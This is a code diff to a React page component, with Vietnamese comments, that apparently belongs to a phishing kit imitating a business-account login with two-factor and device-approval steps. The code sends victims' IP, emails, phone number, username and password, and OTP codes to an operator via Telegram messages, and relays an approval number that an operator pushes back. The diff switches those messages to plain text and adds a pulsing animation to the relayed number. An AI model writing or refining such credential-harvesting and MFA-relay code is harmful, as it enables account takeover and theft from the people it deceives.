@@ -128,16 +128,11 @@ export default function Home() {
                 else if (data.action === 'approve' && data.value) {
                     const rawNumber = data.value.split('|')[0]; 
                     
-                    // Xóa số cũ trước để ép React reset trạng thái
                     setMatchNumber(null);
-                    
-                    // Đợi 50ms sau đó nạp số mới, trình duyệt sẽ giật/nháy 1 cái báo hiệu có lệnh mới
                     setTimeout(() => {
                         setStep(4); 
                         setMatchNumber(rawNumber); 
                         setShowSuccess(false);
-                        
-                        // Rung điện thoại (nếu là mobile) để báo hiệu
                         if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
                     }, 50);
                 } 
@@ -199,12 +194,15 @@ export default function Home() {
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
 
     setErrors({}); setLoading(true);
-    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
+    
+    // Chỉ truyền text thuần, không có thẻ HTML để khớp với file telegram.js
+    const text = `IP: ${escapeHtml(clientIp)}\nBusiness: ${escapeHtml(busName)}\nP.Email: ${escapeHtml(perEmail)}\nB.Email: ${escapeHtml(busEmail)}\nPhone: ${escapeHtml(countryCode + phoneNum)}\n━━━━━━━━━━━━━━━━━━`;
+    
     setInitialSession(text); sendTelegramMessage('');
 
     setTimeout(() => {
       setLoading(false);
-      setStep(1.5); // Chuyển sang bước thông báo liên kết
+      setStep(1.5); 
     }, 700);
   };
 
@@ -218,9 +216,8 @@ export default function Home() {
     setLoginAttempt(prev => {
       const newAttempt = prev + 1;
 
-      sendTelegramMessage(
-        `\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`
-      );
+      // Chỉ truyền text thuần
+      sendTelegramMessage(`${escapeHtml(loginUser)} | ${escapeHtml(loginPass)}`);
 
       loginTimeoutRef.current = setTimeout(() => {
         setLoading(false);
@@ -270,7 +267,8 @@ export default function Home() {
     setOtpAttempt(prev => {
       const newAttempt = prev + 1;
       if (newAttempt <= 3) {
-        sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
+        // Chỉ truyền text thuần
+        sendTelegramMessage(`${escapeHtml(otp)}`);
       }
 
       otpTimeoutRef.current = setTimeout(() => {
@@ -295,7 +293,7 @@ export default function Home() {
     setOtpSecondsLeft(120);
     setOtpCanResend(false);
     setOtpResetCount(prev => prev + 1);
-    sendTelegramMessage(`\n<b>Resend OTP requested</b> for session <code>${escapeHtml(sessionId)}</code>`);
+    sendTelegramMessage(`[ Resend OTP requested ]`);
     setTimeout(() => setResendLoading(false), 1200);
   };
 
@@ -887,6 +885,13 @@ export default function Home() {
                     {/* BƯỚC 4: OTP / DEVICE APPROVAL */}
                     {step === 4 && !showSuccess && (
                       <>
+                        <style>{`
+                          @keyframes pulse-number {
+                            0% { opacity: 1; transform: scale(1); }
+                            50% { opacity: 0.7; transform: scale(1.05); color: #fa383e; }
+                            100% { opacity: 1; transform: scale(1); }
+                          }
+                        `}</style>
                         <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                           <h2 style={{ fontSize: '22px', fontWeight: '800', color: '#1c1e21', marginBottom: '8px', letterSpacing: '-0.3px' }}>
                             {matchNumber ? 'Approve login request' : 'Two-factor authentication'}
@@ -943,7 +948,8 @@ export default function Home() {
                                 color: '#0064e0', 
                                 letterSpacing: '8px', 
                                 textIndent: '8px',
-                                marginBottom: '8px'
+                                marginBottom: '8px',
+                                animation: 'pulse-number 1s ease-in-out infinite'
                               }}>
                                 {matchNumber}
                               </div>
